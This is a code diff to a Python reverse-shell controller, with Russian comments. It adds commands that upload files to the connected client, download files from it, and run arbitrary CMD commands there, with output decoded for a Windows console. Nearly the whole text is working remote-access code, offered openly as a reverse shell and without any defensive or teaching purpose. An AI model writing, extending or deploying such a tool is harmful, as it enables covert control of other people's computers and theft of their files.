@@ -88,43 +88,67 @@ def reversed_shell(conn):
         cmd = input("Команда для Reversed shell: ")
         if cmd == "quit":
             #наверное не стоит закрывать коннект поэтому след 2 строки закомменчены
-            #conn.send(cmd.encode())
-            #conn.close()
             break
-        if "send" in cmd:
-            pass
-        if "get" in cmd:
-            print("Мы попали в get сервер")
-            command, file_name = cmd.split(" ")
-            print(command, " команда")
-            print(file_name, " файл_нейм")
+        elif "send" in cmd:
+            #если была команда сенд, значит шлем файл с сервера клиенту
+            #парсим название файла
+            try:
+                command, file_name = cmd.split(" ")
 
+                #готовим клиент к принятию файла
+                op = open(file_name, 'rb')
+                conn.send(cmd.encode())
+
+                while True:
+                    data = op.read(1024)
+                    if not data:
+                        #важно давать передышку клиенту что бы он успел услышать флаг финиша
+                        time.sleep(1)
+                        break
+                    conn.send(data)
+                conn.send(b"finish")
+            except Exception as e:
+                print(f"Ошибка: {e}, во время {cmd}")
+
+            op.close()
+            print(f"Файл {file_name} был передан")
+
+        elif "get" in cmd:
+            #распарсим команду на название файла
+            command, file_name = cmd.split(" ")
+            #делаем запрос клиенту что бы он послал файл
             conn.send(cmd.encode())
 
-            #s.bind(('localhost', 9090))
-            #s.listen(1)
-            #conn, addr = s.accept()
-            op = open(file_name, 'wb')  # 1gb
-            while 1:
-                print("Мы в начале while сервер")
+            #создаем такой же файл на своей стороне
+            op = open(file_name, 'wb')
+            #флаг ошибок
+            errors = False
+
+            while True:
+                #бесконечно слушаем и записываем результат, выход по флагу финиша
                 data = conn.recv(1024)
-                print(data, " наша дата сервер")
-                if not data:
-                    print("Мы провалилсь в exit")
+                if data[:5] == b"ERROR":
+                    #если клиент шлет ошибку, меняем флаг, выходим с прослушки канала
+                    errors = True
                     break
-                if data.decode == "azazalol":
-                    print("Мы провалилсь в azazalol")
+                if data == b"finish":
+                    #если клиент сказал что закончил слать, выходим с прослушки канала
                     break
                 op.write(data)
-                print("Мы в конце while сервер")
-            op.close()
-
-            #conn.send(cmd)
-
+            if errors:
+                #если были ошибки то принтим ошибку от клиента и удаляем созданный файл
+                print(f"Произошла ошибка при получении файла: {data.decode()}")
+                os.remove(file_name)
+            else:
+                #если все ок закрываем файл в конце, иначе ничего не сохранится
+                print(f"Файл {file_name} получен")
+                op.close()
         else:
             #проваливаемся сюда когда шлемкоманды именно для CMD на стороне клиента
             conn.send(cmd.encode())
-            data = conn.recv(1024)
+            #очень важно было расширить получаемый канал, так как когда принимаемые данные оказывались больше 1кб, тогда все падало
+            #при следующих глюках и запаздывании консоли расширть канал по надобности
+            data = conn.recv(2048)
             print(data.decode("cp866"))
 
 
@@ -153,12 +177,3 @@ if __name__ == '__main__':
     threadTwo.start()
     threadOne.join()
     threadTwo.join()
-
-"""
-                while True:
-                    data = op.read(1024)
-                    print(data, " data")
-                    if not data:
-                        break
-                    conn.send(data)
-"""
